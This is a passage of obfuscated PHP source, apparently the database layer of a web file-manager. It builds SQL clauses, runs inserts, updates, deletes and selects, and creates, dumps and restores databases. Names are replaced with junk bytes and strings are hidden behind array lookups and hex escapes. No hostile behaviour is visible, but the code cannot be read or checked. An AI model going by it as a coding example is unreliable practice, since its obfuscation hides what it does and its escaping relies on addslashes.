$ÊÌò®ĞÎ .= $ĞóİÉ¿’ . $¿ÚÔúö[53] . $’‘è¡ı÷[0] . $¿ÚÔúö[53] . $this->parseValue($’‘è¡ı÷[1]); } elseif (preg_match($¿ÚÔúö[1018], $’‘è¡ı÷[0])) { $ÊÌò®ĞÎ .= $ĞóİÉ¿’ . $¿ÚÔúö[53] . $this->exp[$ ¼÷‘Öƒ] . $¿ÚÔúö[53] . $this->parseValue($’‘è¡ı÷[1]); } elseif (preg_match($¿ÚÔúö[1019], $’‘è¡ı÷[0])) { if (is_array($’‘è¡ı÷[1])) { $„•ç¨Ç = isset($’‘è¡ı÷[2]) ? strtoupper($’‘è¡ı÷[2]) : $¿ÚÔúö[1004]; if (in_array($„•ç¨Ç, array($¿ÚÔúö[1003], $¿ÚÔúö[1004], $¿ÚÔúö[1005]))) { $™Àëí•å = array(); foreach ($’‘è¡ı÷[1] as $—¨’µ«à) { $™Àëí•å[] = $ĞóİÉ¿’ . $¿ÚÔúö[53] . $this->exp[$ ¼÷‘Öƒ] . $¿ÚÔúö[53] . $this->parseValue($—¨’µ«à); } $ÊÌò®ĞÎ .= $¿ÚÔúö[260] . implode($¿ÚÔúö[53] . $„•ç¨Ç . $¿ÚÔúö[53], $™Àëí•å) . $¿ÚÔúö[907]; } } else { $ÊÌò®ĞÎ .= $ĞóİÉ¿’ . $¿ÚÔúö[53] . $this->exp[$ ¼÷‘Öƒ] . $¿ÚÔúö[53] . $this->parseValue($’‘è¡ı÷[1]); } } elseif ($¿ÚÔúö[297] == $ ¼÷‘Öƒ) { $ÊÌò®ĞÎ .= $¿ÚÔúö[905] . $ĞóİÉ¿’ . $¿ÚÔúö[53] . $’‘è¡ı÷[1] . $¿ÚÔúö[1020]; } elseif (preg_match($¿ÚÔúö[1021], $’‘è¡ı÷[0])) { $ÊÌò®ĞÎ .= $’‘è¡ı÷[0]; } elseif (preg_match($¿ÚÔúö[1022], $’‘è¡ı÷[0])) { if (isset($’‘è¡ı÷[2]) && $¿ÚÔúö[297] == $’‘è¡ı÷[2]) { $ÊÌò®ĞÎ .= $ĞóİÉ¿’ . $¿ÚÔúö[53] . $this->exp[$ ¼÷‘Öƒ] . $¿ÚÔúö[53] . $’‘è¡ı÷[1]; } else { if (is_string($’‘è¡ı÷[1])) { $’‘è¡ı÷[1] = explode($¿ÚÔúö[50], $’‘è¡ı÷[1]); } $ÆÇèç­ = implode($¿ÚÔúö[50], $this->parseValue($’‘è¡ı÷[1])); $ÊÌò®ĞÎ .= $ĞóİÉ¿’ . $¿ÚÔúö[53] . $this->exp[$ ¼÷‘Öƒ] . $¿ÚÔúö[905] . $ÆÇèç­ . $¿ÚÔúö[907]; } } elseif (preg_match($¿ÚÔúö[1023], $’‘è¡ı÷[0])) { $Ğ”ıãñÕ = is_string($’‘è¡ı÷[1]) ? explode($¿ÚÔúö[50], $’‘è¡ı÷[1]) : $’‘è¡ı÷[1]; $ÊÌò®ĞÎ .= $¿ÚÔúö[905] . $ĞóİÉ¿’ . $¿ÚÔúö[53] . $this->exp[$ ¼÷‘Öƒ] . $¿ÚÔúö[53] . $this->parseValue($Ğ”ıãñÕ[0]) . $¿ÚÔúö[1006] . $this->parseValue($Ğ”ıãñÕ[1]) . $¿ÚÔúö[278]; } else { think_exception(think_lang($¿ÚÔúö[1009]) . $¿ÚÔúö[4] . $’‘è¡ı÷[0]); } } else { $¾ö€¤Ø = count($’‘è¡ı÷); $ÌÏøÖÍÀ = $¿ÚÔúö[12]; if (is_string($’‘è¡ı÷[$¾ö€¤Ø - 1])) { $ÌÏøÖÍÀ = isset($’‘è¡ı÷[$¾ö€¤Ø - 1]) ? strtoupper($’‘è¡ı÷[$¾ö€¤Ø - 1]) : $¿ÚÔúö[12]; if (in_array($ÌÏøÖÍÀ, array($¿ÚÔúö[1003], $¿ÚÔúö[1004], $¿ÚÔúö[1005]))) { $¾ö€¤Ø = $¾ö€¤Ø - 1; } } else { $ÌÏøÖÍÀ = $¿ÚÔúö[1003]; } for ($¾€¥†¡Õ = 0; $¾€¥†¡Õ < $¾ö€¤Ø; $¾€¥†¡Õ++) { $Ğ”ıãñÕ = is_array($’‘è¡ı÷[$¾€¥†¡Õ]) ? $’‘è¡ı÷[$¾€¥†¡Õ][1] : $’‘è¡ı÷[$¾€¥†¡Õ]; if ($¿ÚÔúö[297] == strtolower($’‘è¡ı÷[$¾€¥†¡Õ][0])) { $ÊÌò®ĞÎ .= $¿ÚÔúö[260] . $ĞóİÉ¿’ . $¿ÚÔúö[53] . $Ğ”ıãñÕ . $¿ÚÔúö[1020] . $ÌÏøÖÍÀ . $¿ÚÔúö[53]; } else { $‡àÅ¿â  = is_array($’‘è¡ı÷[$¾€¥†¡Õ]) ? $this->exp[strtolower($’‘è¡ı÷[$¾€¥†¡Õ][0])] : $¿ÚÔúö[886]; if (!$‡àÅ¿â  && is_array($’‘è¡ı÷[$¾€¥†¡Õ]) && in_array($’‘è¡ı÷[$¾€¥†¡Õ][0], array($¿ÚÔúö[886], $¿ÚÔúö[1013], $¿ÚÔúö[1014], $¿ÚÔúö[1015], $¿ÚÔúö[1016], $¿ÚÔúö[1017]))) { $‡àÅ¿â  = $’‘è¡ı÷[$¾€¥†¡Õ][0]; } $ÊÌò®ĞÎ .= $¿ÚÔúö[260] . $ĞóİÉ¿’ . $¿ÚÔúö[53] . $‡àÅ¿â  . $¿ÚÔúö[53] . $this->parseValue($Ğ”ıãñÕ) . $¿ÚÔúö[1020] . $ÌÏøÖÍÀ . $¿ÚÔúö[53]; } } $ÊÌò®ĞÎ = substr($ÊÌò®ĞÎ, 0, -4); } } else { $ÊÌò®ĞÎ .= $ĞóİÉ¿’ . $¿ÚÔúö[1024] . $this->parseValue($’‘è¡ı÷); } return $ÊÌò®ĞÎ; } protected function parseThinkWhere($î¼†¢çœ, $…©¡Œü) { $½šÍ“èï =& $_SERVER[Îûáû“ş]; $‡úßÔÒ² = $½šÍ“èï[12]; switch ($î¼†¢çœ) { case $½šÍ“èï[352]: $‡úßÔÒ² = $…©¡Œü; break; case $½šÍ“èï[1007]: $‡úßÔÒ² = is_string($…©¡Œü) ? $…©¡Œü : substr($this->parseWhere($…©¡Œü), 6); break; case $½šÍ“èï[1025]: parse_str($…©¡Œü, $’““åºü); if (isset($’““åºü[$½šÍ“èï[1002]])) { $áŞÆ¹Ïƒ = $½šÍ“èï[53] . strtoupper($’““åºü[$½šÍ“èï[1002]]) . $½šÍ“èï[53]; unset($’““åºü[$½šÍ“èï[1002]]); } else { $áŞÆ¹Ïƒ = $½šÍ“èï[1006]; } $Áıı•í = array(); foreach ($’““åºü as $òâ´Ôö => $Šƒ€¦’) { $Áıı•í[] = $this->parseKey($òâ´Ôö) . $½šÍ“èï[1024] . $this->parseValue($Šƒ€¦’); } $‡úßÔÒ² = implode($áŞÆ¹Ïƒ, $Áıı•í); break; } return $‡úßÔÒ²; } protected function parseLimit($«÷½¼Ë¹) { $Éü›‘§ô =& $_SERVER[Îûáû“ş]; return !empty($«÷½¼Ë¹) ? $Éü›‘§ô[51] . $«÷½¼Ë¹ . $Éü›‘§ô[53] : $Éü›‘§ô[12]; } protected function parseJoin($­‰ĞÖªÃ) { $Ğà£‘¹ =& $_SERVER[Îûáû“ş]; $ãı„¿²† = $Ğà£‘¹[12]; if (!empty($­‰ĞÖªÃ)) { if (is_array($­‰ĞÖªÃ)) { foreach ($­‰ĞÖªÃ as $È¿ÍÒÁ¯ => $ÆÅÌ€ê) { if (!1 !== stripos($ÆÅÌ€ê, $Ğà£‘¹[1026])) { $ãı„¿²† .= $Ğà£‘¹[53] . $ÆÅÌ€ê; } else { $ãı„¿²† .= $Ğà£‘¹[1027] . $ÆÅÌ€ê; } } } else { $ãı„¿²† .= $Ğà£‘¹[1027] . $­‰ĞÖªÃ; } } $ãı„¿²† = preg_replace($Ğà£‘¹[1028], think_config($Ğà£‘¹[932]) . $Ğà£‘¹[1029], $ãı„¿²†); return $ãı„¿²†; } protected function parseOrder($ˆ¯†ú£†) { $öÔäÀú =& $_SERVER[Îûáû“ş]; if (is_array($ˆ¯†ú£†)) { $›‘ÒêĞ = array(); foreach ($ˆ¯†ú£† as $ÒĞø¶Êü => $ŠíõøşÃ) { if (is_numeric($ÒĞø¶Êü)) { $›‘ÒêĞ[] = $this->parseKey($ŠíõøşÃ); } else { $ŠíõøşÃ = in_array(strtoupper(trim($ŠíõøşÃ)), array($öÔäÀú[1030], $öÔäÀú[1031])) ? $öÔäÀú[53] . $ŠíõøşÃ : $öÔäÀú[12]; if (preg_match($öÔäÀú[1032], $ÒĞø¶Êü)) { $›‘ÒêĞ[] = $this->parseKey($ÒĞø¶Êü) . $ŠíõøşÃ; } else { think_exception($öÔäÀú[1033] . $ÒĞø¶Êü); } } } $ˆ¯†ú£† = implode($öÔäÀú[50], $›‘ÒêĞ); } return !empty($ˆ¯†ú£†) ? $öÔäÀú[1034] . $ˆ¯†ú£† : $öÔäÀú[12]; } protected function parseGroup($‡Å½§®Ã) { $ÙŞ¾Ö†ú =& $_SERVER[Îûáû“ş]; return !empty($‡Å½§®Ã) ? $ÙŞ¾Ö†ú[1035] . $‡Å½§®Ã : $ÙŞ¾Ö†ú[12]; } protected function parseHaving($…“Äıò) { $¾ŞÈŒö =& $_SERVER[Îûáû“ş]; return !empty($…“Äıò) ? $¾ŞÈŒö[1036] . $…“Äıò : $¾ŞÈŒö[12]; } protected function parseComment($Ü£æ¶·“) { $½”ºÚÕĞ =& $_SERVER[Îûáû“ş]; return !empty($Ü£æ¶·“) ? $½”ºÚÕĞ[1037] . $Ü£æ¶·“ . $½”ºÚÕĞ[1038] : $½”ºÚÕĞ[12]; } protected function parseDistinct($ÏœÍûü) { $‚¥Ñª§÷ =& $_SERVER[Îûáû“ş]; return !empty($ÏœÍûü) ? $‚¥Ñª§÷[1039] : $‚¥Ñª§÷[12]; } protected function parseUnion($•îå¦€) { $ç¬‰Ğƒñ =& $_SERVER[Îûáû“ş]; if (empty($•îå¦€)) { return $ç¬‰Ğƒñ[12]; } if (isset($•îå¦€[$ç¬‰Ğƒñ[348]])) { $ ÃŒèàæ = $ç¬‰Ğƒñ[1040]; unset($•îå¦€[$ç¬‰Ğƒñ[348]]); } else { $ ÃŒèàæ = $ç¬‰Ğƒñ[1041]; } foreach ($•îå¦€ as $Ö†Ÿä¸À) { $ˆÔ‘ãõê[] = $ ÃŒèàæ . (is_array($Ö†Ÿä¸À) ? $this->buildSelectSql($Ö†Ÿä¸À) : $Ö†Ÿä¸À); } return implode($ç¬‰Ğƒñ[53], $ˆÔ‘ãõê); } public function insert($Æû£ÄéÙ, $ã„Øóãä = array(), $‹¦çÁÁú = false) { $°ñ¢ú°¦ =& $_SERVER[Îûáû“ş]; $ºÚÏ˜¡æ = $˜´Ş±ÖÖ = array(); $this->model = $ã„Øóãä[$°ñ¢ú°¦[281]]; foreach ($Æû£ÄéÙ as $ıá“©‹‹ => $æíƒÛ­é) { if (is_array($æíƒÛ­é) && $°ñ¢ú°¦[297] == $æíƒÛ­é[0]) { $˜´Ş±ÖÖ[] = $this->parseKey($ıá“©‹‹); $ºÚÏ˜¡æ[] = $æíƒÛ­é[1]; } elseif (is_scalar($æíƒÛ­é) || is_null($æíƒÛ­é)) { $˜´Ş±ÖÖ[] = $this->parseKey($ıá“©‹‹); $ºÚÏ˜¡æ[] = $this->parseValue($æíƒÛ­é); } } $àÅÃ˜õÆ = ($‹¦çÁÁú ? $°ñ¢ú°¦[909] : $°ñ¢ú°¦[910]) . $°ñ¢ú°¦[911] . $this->parseTable($ã„Øóãä[$°ñ¢ú°¦[279]]) . $°ñ¢ú°¦[905] . implode($°ñ¢ú°¦[50], $˜´Ş±ÖÖ) . $°ñ¢ú°¦[906] . implode($°ñ¢ú°¦[50], $ºÚÏ˜¡æ) . $°ñ¢ú°¦[907]; $àÅÃ˜õÆ .= $this->parseLock(isset($ã„Øóãä[$°ñ¢ú°¦[842]]) ? $ã„Øóãä[$°ñ¢ú°¦[842]] : !1); $àÅÃ˜õÆ .= $this->parseComment(!empty($ã„Øóãä[$°ñ¢ú°¦[354]]) ? $ã„Øóãä[$°ñ¢ú°¦[354]] : $°ñ¢ú°¦[12]); return $this->execute($àÅÃ˜õÆ, $this->parseBind(!empty($ã„Øóãä[$°ñ¢ú°¦[285]]) ? $ã„Øóãä[$°ñ¢ú°¦[285]] : array())); } public function selectInsert($Â”ô™×, $Ë±¨ˆâ¤, $¬ÊÎÕ—ã = array()) { $½¡²­¨ =& $_SERVER[Îûáû“ş]; $this->model = $¬ÊÎÕ—ã[$½¡²­¨[281]]; if (is_string($Â”ô™×)) { $Â”ô™× = explode($½¡²­¨[50], $Â”ô™×); } array_walk($Â”ô™×, array($this, $½¡²­¨[908])); $˜ü´±Ö• = $½¡²­¨[1042] . $this->parseTable($Ë±¨ˆâ¤) . $½¡²­¨[905] . implode($½¡²­¨[50], $Â”ô™×) . $½¡²­¨[1020]; $˜ü´±Ö• .= $this->buildSelectSql($¬ÊÎÕ—ã); return $this->execute($˜ü´±Ö•, $this->parseBind(!empty($¬ÊÎÕ—ã[$½¡²­¨[285]]) ? $¬ÊÎÕ—ã[$½¡²­¨[285]] : array())); } public function update($•ÀûÛúñ, $†¸°á‡Â) { $ÊËœá” =& $_SERVER[Îûáû“ş]; $this->model = $†¸°á‡Â[$ÊËœá”[281]]; $è åŒÉ˜ = $ÊËœá”[1043] . $this->parseTable($†¸°á‡Â[$ÊËœá”[279]]) . $this->parseSet($•ÀûÛúñ) . $this->parseWhere(!empty($†¸°á‡Â[$ÊËœá”[275]]) ? $†¸°á‡Â[$ÊËœá”[275]] : $ÊËœá”[12]) . $this->parseOrder(!empty($†¸°á‡Â[$ÊËœá”[365]]) ? $†¸°á‡Â[$ÊËœá”[365]] : $ÊËœá”[12]) . $this->parseLimit(!empty($†¸°á‡Â[$ÊËœá”[292]]) ? $†¸°á‡Â[$ÊËœá”[292]] : $ÊËœá”[12]) . $this->parseLock(isset($†¸°á‡Â[$ÊËœá”[842]]) ? $†¸°á‡Â[$ÊËœá”[842]] : !1) . $this->parseComment(!empty($†¸°á‡Â[$ÊËœá”[354]]) ? $†¸°á‡Â[$ÊËœá”[354]] : $ÊËœá”[12]); return $this->execute($è åŒÉ˜, $this->parseBind(!empty($†¸°á‡Â[$ÊËœá”[285]]) ? $†¸°á‡Â[$ÊËœá”[285]] : array())); } public function delete($ë­–Ì¡ = array()) { $ƒ½†Åà =& $_SERVER[Îûáû“ş]; $this->model = $ë­–Ì¡[$ƒ½†Åà[281]]; $Úæ«Ø = $ƒ½†Åà[1044] . $this->parseTable($ë­–Ì¡[$ƒ½†Åà[279]]) . $this->parseWhere(!empty($ë­–Ì¡[$ƒ½†Åà[275]]) ? $ë­–Ì¡[$ƒ½†Åà[275]] : $ƒ½†Åà[12]) . $this->parseOrder(!empty($ë­–Ì¡[$ƒ½†Åà[365]]) ? $ë­–Ì¡[$ƒ½†Åà[365]] : $ƒ½†Åà[12]) . $this->parseLimit(!empty($ë­–Ì¡[$ƒ½†Åà[292]]) ? $ë­–Ì¡[$ƒ½†Åà[292]] : $ƒ½†Åà[12]) . $this->parseLock(isset($ë­–Ì¡[$ƒ½†Åà[842]]) ? $ë­–Ì¡[$ƒ½†Åà[842]] : !1) . $this->parseComment(!empty($ë­–Ì¡[$ƒ½†Åà[354]]) ? $ë­–Ì¡[$ƒ½†Åà[354]] : $ƒ½†Åà[12]); return $this->execute($Úæ«Ø, $this->parseBind(!empty($ë­–Ì¡[$ƒ½†Åà[285]]) ? $ë­–Ì¡[$ƒ½†Åà[285]] : array())); } public function select($ãŠ¯ = array()) { $Ö¿Ô¥ñä =& $_SERVER[Îûáû“ş]; $this->model = $ãŠ¯[$Ö¿Ô¥ñä[281]]; $®çÙù”´ = $this->buildSelectSql($ãŠ¯); $Ë¹÷’õŒ = isset($ãŠ¯[$Ö¿Ô¥ñä[349]]) ? $ãŠ¯[$Ö¿Ô¥ñä[349]] : !1; if ($Ë¹÷’õŒ) { $Ø¿Ğµ§ = is_string($Ë¹÷’õŒ[$Ö¿Ô¥ñä[94]]) ? $Ë¹÷’õŒ[$Ö¿Ô¥ñä[94]] : $Ö¿Ô¥ñä[1045] . md5($®çÙù”´); $Ò“½©ş = think_cache($Ø¿Ğµ§, $Ö¿Ô¥ñä[12], $Ë¹÷’õŒ); if (!1 !== $Ò“½©ş) { return $Ò“½©ş; } } $—ˆıÖ¦€ = $this->query($®çÙù”´, $this->parseBind(!empty($ãŠ¯[$Ö¿Ô¥ñä[285]]) ? $ãŠ¯[$Ö¿Ô¥ñä[285]] : array())); if ($Ë¹÷’õŒ && !1 !== $—ˆıÖ¦€) { think_cache($Ø¿Ğµ§, $—ˆıÖ¦€, $Ë¹÷’õŒ); } return $—ˆıÖ¦€; } public function buildSelectSql($ÓøÅÄÀİ = array()) { $Ÿè½­ÛÀ =& $_SERVER[Îûáû“ş]; if (isset($ÓøÅÄÀİ[$Ÿè½­ÛÀ[353]])) { if (strpos($ÓøÅÄÀİ[$Ÿè½­ÛÀ[353]], $Ÿè½­ÛÀ[50])) { list($‰·Ášß¥, $ò˜Â¢ëñ) = explode($Ÿè½­ÛÀ[50], $ÓøÅÄÀİ[$Ÿè½­ÛÀ[353]]); } else { $‰·Ášß¥ = $ÓøÅÄÀİ[$Ÿè½­ÛÀ[353]]; } $‰·Ášß¥ = $‰·Ášß¥ ? $‰·Ášß¥ : 1; $ò˜Â¢ëñ = isset($ò˜Â¢ëñ) ? $ò˜Â¢ëñ : (is_numeric($ÓøÅÄÀİ[$Ÿè½­ÛÀ[292]]) ? $ÓøÅÄÀİ[$Ÿè½­ÛÀ[292]] : 20); $ŸÄ¯şÜÛ = $ò˜Â¢ëñ * ((int) $‰·Ášß¥ - 1); $ÓøÅÄÀİ[$Ÿè½­ÛÀ[292]] = $ŸÄ¯şÜÛ . $Ÿè½­ÛÀ[50] . $ò˜Â¢ëñ; } if (think_config($Ÿè½­ÛÀ[1046])) { $ùƒ¨©³Ö = $Ÿè½­ÛÀ[1047] . md5(serialize($ÓøÅÄÀİ)); $×ÂÒ¡ûå = think_cache($ùƒ¨©³Ö); if ($×ÂÒ¡ûå) { return $×ÂÒ¡ûå; } } $Á¥¶«¤“ = $this->parseSql($this->selectSql, $ÓøÅÄÀİ); $Á¥¶«¤“ .= $this->parseLock(isset($ÓøÅÄÀİ[$Ÿè½­ÛÀ[842]]) ? $ÓøÅÄÀİ[$Ÿè½­ÛÀ[842]] : !1); if (isset($ùƒ¨©³Ö)) { think_cache($ùƒ¨©³Ö, $Á¥¶«¤“); } return $Á¥¶«¤“; } public function parseSql($Ç¸Ö×…, $¦­œ©À = array()) { $ÅîÒÂ’¬ =& $_SERVER[Îûáû“ş]; $Ç¸Ö×… = str_replace(array($ÅîÒÂ’¬[1048], $ÅîÒÂ’¬[1049], $ÅîÒÂ’¬[1050], $ÅîÒÂ’¬[1051], $ÅîÒÂ’¬[1052], $ÅîÒÂ’¬[1053], $ÅîÒÂ’¬[1054], $ÅîÒÂ’¬[1055], $ÅîÒÂ’¬[1056], $ÅîÒÂ’¬[1057], $ÅîÒÂ’¬[1058]), array($this->parseTable("{$¦­œ©À[$ÅîÒÂ’¬[279]]}"), $this->parseDistinct(isset($¦­œ©À[$ÅîÒÂ’¬[1059]]) ? $¦­œ©À[$ÅîÒÂ’¬[1059]] : !1), $this->parseField(!empty($¦­œ©À[$ÅîÒÂ’¬[273]]) ? $¦­œ©À[$ÅîÒÂ’¬[273]] : $ÅîÒÂ’¬[189]), $this->parseJoin(!empty($¦­œ©À[$ÅîÒÂ’¬[282]]) ? $¦­œ©À[$ÅîÒÂ’¬[282]] : $ÅîÒÂ’¬[12]), $this->parseWhere(!empty($¦­œ©À[$ÅîÒÂ’¬[275]]) ? $¦­œ©À[$ÅîÒÂ’¬[275]] : $ÅîÒÂ’¬[12]), $this->parseGroup(!empty($¦­œ©À[$ÅîÒÂ’¬[505]]) ? $¦­œ©À[$ÅîÒÂ’¬[505]] : $ÅîÒÂ’¬[12]), $this->parseHaving(!empty($¦­œ©À[$ÅîÒÂ’¬[1060]]) ? $¦­œ©À[$ÅîÒÂ’¬[1060]] : $ÅîÒÂ’¬[12]), $this->parseOrder(!empty($¦­œ©À[$ÅîÒÂ’¬[365]]) ? $¦­œ©À[$ÅîÒÂ’¬[365]] : $ÅîÒÂ’¬[12]), $this->parseLimit(!empty($¦­œ©À[$ÅîÒÂ’¬[292]]) ? $¦­œ©À[$ÅîÒÂ’¬[292]] : $ÅîÒÂ’¬[12]), $this->parseUnion(!empty($¦­œ©À[$ÅîÒÂ’¬[347]]) ? $¦­œ©À[$ÅîÒÂ’¬[347]] : $ÅîÒÂ’¬[12]), $this->parseComment(!empty($¦­œ©À[$ÅîÒÂ’¬[354]]) ? $¦­œ©À[$ÅîÒÂ’¬[354]] : $ÅîÒÂ’¬[12])), $Ç¸Ö×…); return $Ç¸Ö×…; } public function getLastSql($ÅıÉîó‘ = '') { return $ÅıÉîó‘ ? $this->modelSql[$ÅıÉîó‘] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($»óË´¾Ì) { return addslashes($»óË´¾Ì); } public function setModel($çÛäğ¸±) { $this->model = $çÛäğ¸±; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ç‘ ®ƒğ = array()) { $¸Ï›¸È± =& $_SERVER[Îûáû“ş]; if (empty($Ç‘ ®ƒğ)) { $Ç‘ ®ƒğ = $GLOBALS[$¸Ï›¸È±[6]][$¸Ï›¸È±[21]]; } $this->database = $Ç‘ ®ƒğ; } public function model($ü”„ÓŠ€ = '') { return new ModelBase($ü”„ÓŠ€, $_SERVER[Îûáû“ş][12], $this->database); } public function db($İï§—õÜ = false) { $ÁÑ—÷œ± =& $_SERVER[Îûáû“ş]; $ˆÚ ¸ğ‹ = array_change_key_case($this->database); if ($this->dbType() == $ÁÑ—÷œ±[13] || !$İï§—õÜ) { return $this->model()->db(); } $“ ÷ªÎÉ = $ˆÚ ¸ğ‹[$ÁÑ—÷œ±[974]]; $ˆÚ ¸ğ‹[$ÁÑ—÷œ±[974]] = $ÁÑ—÷œ±[12]; if ($ˆÚ ¸ğ‹[$ÁÑ—÷œ±[969]] == $ÁÑ—÷œ±[966]) { $¹½Ö¹Î = $ˆÚ ¸ğ‹[$ÁÑ—÷œ±[975]]; $ˆÚ ¸ğ‹[$ÁÑ—÷œ±[975]] = substr($¹½Ö¹Î, 0, strrpos($¹½Ö¹Î, $ÁÑ—÷œ±[1061])); } $this->database = $ˆÚ ¸ğ‹; $Ëõ‹ÈüÖ = $this->model()->db(); try { $şæ™Ú˜— = $Ëõ‹ÈüÖ->execute("\x73\x68\157\167\x20\x64\x61\x74\141\142\x61\x73\x65\x73\40\x6c\x69\153\145\x20\x27{$“ ÷ªÎÉ}\x27"); } catch (Exception $Ê©Í˜®Ó) { } if (!$şæ™Ú˜—) { $Ëõ‹ÈüÖ->execute("\x63\162\145\141\x74\145\40\144\x61\164\x61\x62\141\163\145\40\x60{$“ ÷ªÎÉ}\x60"); } $ˆÚ ¸ğ‹[$ÁÑ—÷œ±[974]] = $“ ÷ªÎÉ; if ($ˆÚ ¸ğ‹[$ÁÑ—÷œ±[969]] == $ÁÑ—÷œ±[966]) { $ˆÚ ¸ğ‹[$ÁÑ—÷œ±[975]] .= $ÁÑ—÷œ±[1061] . $“ ÷ªÎÉ; } $this->database = $ˆÚ ¸ğ‹; $Ëõ‹ÈüÖ->execute("\x75\163\145\x20\140{$“ ÷ªÎÉ}\140"); return $Ëõ‹ÈüÖ; } public function createTable($½É‰İêà, &$ç€—³Å) { $ˆî¡·¯ =& $_SERVER[Îûáû“ş]; if (!IO::exist($½É‰İêà)) { ActionCall($ˆî¡·¯[1062], !0, 0); show_json(LNG($ˆî¡·¯[1063]), !1); } $“÷²àûÊ = $this->model()->db(); $òò©¿Ä™ = sqlSplit(IO::getContent($½É‰İêà)); foreach ($òò©¿Ä™ as $–‚• ï³) { $øåÄ‚ÆÔ = stripos($–‚• ï³, $ˆî¡·¯[1064]) === 0; if ($øåÄ‚ÆÔ) { $ç€—³Å->task[$ˆî¡·¯[785]] += 1; } $“÷²àûÊ->execute($–‚• ï³); if ($øåÄ‚ÆÔ) { preg_match($ˆî¡·¯[1065], $–‚• ï³, $ÅŒ”‰Ò±); $ç€—³Å->task[$ˆî¡·¯[1066]] = $ÅŒ”‰Ò±[1]; $ç€—³Å->update(1); } } } public function insertTable($ô–‚í’², &$Ö ÑÜùÈ) { $äÉ’Ó¥ú =& $_SERVER[Îûáû“ş]; $’«ö °ì = $this->model()->db(); $ğÌÏøÂú = $²¼¨’Á¶ ? array($²¼¨’Á¶) : $’«ö °ì->getTables(); foreach ($ô–‚í’² as $Ğ²ÃÏäÃ) { $²¼¨’Á¶ = basename($Ğ²ÃÏäÃ, $äÉ’Ó¥ú[787]); if (!in_array($²¼¨’Á¶, $ğÌÏøÂú)) { continue; } $Ö ÑÜùÈ->task[$äÉ’Ó¥ú[1066]] = $²¼¨’Á¶; if (get_filesize($Ğ²ÃÏäÃ) == 0) { continue; } $»¯–Ú § = $this->sqlToDb($Ğ²ÃÏäÃ, $Ö ÑÜùÈ); if (!$»¯–Ú §) { ActionCall($äÉ’Ó¥ú[1062], !0, 0); show_json(LNG($äÉ’Ó¥ú[1067]) . "\133{$²¼¨’Á¶}\135", !1); } } } public function sqlFromDb($×¢‹ä¦, $¤“…Ş•º, &$ÖàÛÇÕü, $Ëûíõæ‡ = '') { if ($ÖàÛÇÕü) { $ÖàÛÇÕü->task[$_SERVER[Îûáû“ş][1066]] = $×¢‹ä¦; } $‰ÀÑÕç¥ = $this->model($×¢‹ä¦); $œÍØßÜó = 0; $ëğı¿òÖ = 0; $Ì±Ó«Œè = 10000; $ú¸ÁÏ” = fopen($¤“…Ş•º, $_SERVER[Îûáû“ş][1068]); $¼Ô€‰Õú = $‰ÀÑÕç¥->getPk(); $¡»ê×® = $‰ÀÑÕç¥->getDbFields(); $ıâÓÓØ™ = $_SERVER[Îûáû“ş][12]; if ($GLOBALS[$_SERVER[Îûáû“ş][786]] && in_array($×¢‹ä¦, array($_SERVER[Îûáû“ş][1069], $_SERVER[Îûáû“ş][1070]))) { $ıâÓÓØ™ = $×¢‹ä¦; } do { $´ëêÖÀŠ = array($¼Ô€‰Õú => array($_SERVER[Îûáû“ş][1016], $ëğı¿òÖ)); $ş²¦ö‚ò = $‰ÀÑÕç¥->where($´ëêÖÀŠ)->field($¡»ê×®)->order($¼Ô€‰Õú . $_SERVER[Îûáû“ş][1071])->limit($Ì±Ó«Œè)->select(); $ş²¦ö‚ò = !empty($ş²¦ö‚ò) ? $ş²¦ö‚ò : array(); if (!($ÖèÊãßÂ = count($ş²¦ö‚ò))) { break; } $§ÔøĞ‘Â = end($ş²¦ö‚ò); $ëğı¿òÖ = $§ÔøĞ‘Â[$¼Ô€‰Õú]; $©¸ì­˜‡ = array(); foreach ($ş²¦ö‚ò as $ÏüÑÃğ) { if ($ıâÓÓØ™) { if ($×¢‹ä¦ == $_SERVER[Îûáû“ş][1069]) { if ($ÏüÑÃğ[$_SERVER[Îûáû“ş][33]] == $_SERVER[Îûáû“ş][1072]) { $Í¤Á»åÔ = json_decode($ÏüÑÃğ[$_SERVER[Îûáû“ş][374]], !0); if ($Í¤Á»åÔ[$_SERVER[Îûáû“ş][32]] == $GLOBALS[$_SERVER[Îûáû“ş][786]] && $Í¤Á»åÔ[$_SERVER[Îûáû“ş][748]] != 1) { continue; } } } else { if ($ÏüÑÃğ[$_SERVER[Îûáû“ş][33]] == $_SERVER[Îûáû“ş][1073] && $ÏüÑÃğ[$_SERVER[Îûáû“ş][94]] == $_SERVER[Îûáû“ş][778]) { continue; } } } if ($Ëûíõæ‡) { $ÏüÑÃğ[$_SERVER[Îûáû“ş][84]] = "\x7b\x69\x6f\x3a{$Ëûíõæ‡}\x7d" . substr($ÏüÑÃğ[$_SERVER[Îûáû“ş][84]], strlen("\173\x69\157\72{$ÏüÑÃğ[$_SERVER[Îûáû“ş][816]]}\x7d")); $ÏüÑÃğ[$_SERVER[Îûáû“ş][816]] = $Ëûíõæ‡; } $©¸ì­˜‡[] = $_SERVER[Îûáû“ş][1074] . $this->sqlEncode($ÏüÑÃğ) . $_SERVER[Îûáû“ş][1075]; } $ÎŠøõ¢º = "\111\116\x53\105\x52\124\40\111\116\124\117\x20\140{$×¢‹ä¦}\140\x20\x28\x60" . implode($_SERVER[Îûáû“ş][1076], $¡»ê×®) . $_SERVER[Îûáû“ş][1077]; fwrite($ú¸ÁÏ”, $ÎŠøõ¢º . implode($_SERVER[Îûáû“ş][1078], $©¸ì­˜‡) . $_SERVER[Îûáû“ş][71] . PHP_EOL); $œÍØßÜó += $ÖèÊãßÂ; if ($ÖàÛÇÕü) { $ÖàÛÇÕü->update($ÖèÊãßÂ); } } while ($Ì±Ó«Œè == $ÖèÊãßÂ); fclose($ú¸ÁÏ”); return $œÍØßÜó; } public function sqlToDb($ö¥»áü·, &$Åî‚†èØ) { $ê¨‡” =& $_SERVER[Îûáû“ş]; $Èıİš¬ì = $this->model()->db(); $ÄŞ‡ªßº = @fopen($ö¥»áü·, $ê¨‡”[1079]); if (!$ÄŞ‡ªßº) { return !1; } $¸Îé…òï = 0; $ŠÑ¬ñ‡Æ = $ê¨‡”[12]; $Ìí¾íç = array(); $À¼ËÚƒ = $this->dbType(); $£ÉÌ±„è = $À¼ËÚƒ == $ê¨‡”[13] ? 500 : 2000; $Ò»ûÂîÂ = basename($ö¥»áü·, 